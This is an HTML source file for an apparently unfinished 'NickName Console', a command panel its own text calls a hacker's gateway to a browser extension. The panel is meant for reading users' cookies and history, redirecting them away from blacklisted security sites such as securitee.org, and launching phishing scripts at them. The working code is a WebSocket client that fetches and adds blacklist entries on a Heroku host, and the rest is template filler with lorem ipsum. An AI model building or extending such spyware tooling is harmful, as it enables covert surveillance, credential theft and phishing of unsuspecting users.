<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SpeedDemon</title>
    <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
	  <script src="bootstrap-4.0.0-dist/js/bootstrap.min.js"></script>
	  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
  	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
  </head>

  

  <body data-spy = "scroll" data-target=".navbar">

	<nav class="navbar navbar-expand-sm bg-dark navbar-dark fixed-top">
		<a class="navbar-brand" href="#">NickName123</a>
		<ul class = "navbar-nav">
			<li class="nav-item">
				<a class="nav-link" href="#userSection">Users</a>
			</li>
			<li class = "nav-item">
				<a class="nav-link" href="#blackListSection">Blacklist</a>
			</li>
		</ul>
	</nav>

	<!-- Logo And Name -->
	<div class = "jumbotron">
		<h1 class = "display-4">NickName Console</h1>
		<p class = "lead">
			This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
		</p>
		<hr class="my-4">
		<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
	</div>  

	<div id = "userSection">
	
		<div class="container-fluid">
			<h3>All Users</h3>
			<p><strong>Note:</strong> The <strong>data-parent</strong> attribute makes sure that all collapsible elements under the specified parent will be closed when one of the collapsible item is shown.</p>
			<div id="accordion">

				<div class="card">
				<div class="card-header">
					<a class="card-link" data-toggle="collapse" href="#collapseOne">
					Collapsible Group Item #1
					</a>
				</div>
				<div id="collapseOne" class="collapse show" data-parent="#accordion">
					<div class="card-body">
					Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
					</div>
				</div>
				</div>

				<div class="card">
				<div class="card-header">
					<a class="collapsed card-link" data-toggle="collapse" href="#collapseTwo">
					Collapsible Group Item #2
				</a>
				</div>
				<div id="collapseTwo" class="collapse" data-parent="#accordion">
					<div class="card-body">
					Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
					</div>
				</div>
				</div>

				<div class="card">
				<div class="card-header">
					<a class="collapsed card-link" data-toggle="collapse" href="#collapseThree">
					Collapsible Group Item #3
					</a>
				</div>
				<div id="collapseThree" class="collapse" data-parent="#accordion">
					<div class="card-body">
					Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
					</div>
				</div>
				</div>
				
			</div>
		</div>

	</div>	
	<!-- Spacing things Out -->
	<br><br>

	<div class = "ml-3">

	<!-- Adding Blacklisted Site -->
	<div id = "blackListSection">
	<h4>Add Site to Blacklist Here</h4>
	<input type="text" class="form-control blacklist" placeholder="URL">
	<button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>

	<br><br><br>

	<h4>Blacklisted Sites</h4>
	<ul class = "list-group" id="blacklist">
		<li class="list-group-item">securitee.org</li>
	</ul>

  <script>
    var HOST = 'wss://projectnickname123.herokuapp.com';
    var ws = new WebSocket(HOST);  
    var sites = new Array();
    ws.onopen = function(){
      var jsonPackage ={type:"getList"};
      ws.send(JSON.stringify(jsonPackage));
      console.log("Request sent");
    }
    ws.onmessage = function(e){
      if(e.type == "blackList"){
        object = JSON.parse(e.data);
        sites = object.allSites;
        console.log(sites);
        sites.forEach(site => {
          node = document.getElementById("blacklist");
          aRow = document.createElement("tr");
          aCol = document.createTextNode(site);
          node.appendChild(aRow);
          aRow.appendChild(aCol);
        });
      }
    }
  </script>
  
  <script>
	    function blackList(){
	        var jsonPackage = {id: 0, type:'list', addString: URL};
	        ws.send(JSON.stringify(jsonPackage));
	    }
		window.addEventListener("hashchange", function() { scrollBy(0, -70) });
	</script>

	<script>
		function idClick(count){		
			localStorage.setItem("id", document.getElementById(count).innerHTML);
		}
	</script>
	
	</div>
	</div>
	</div>
  </body>

</html>
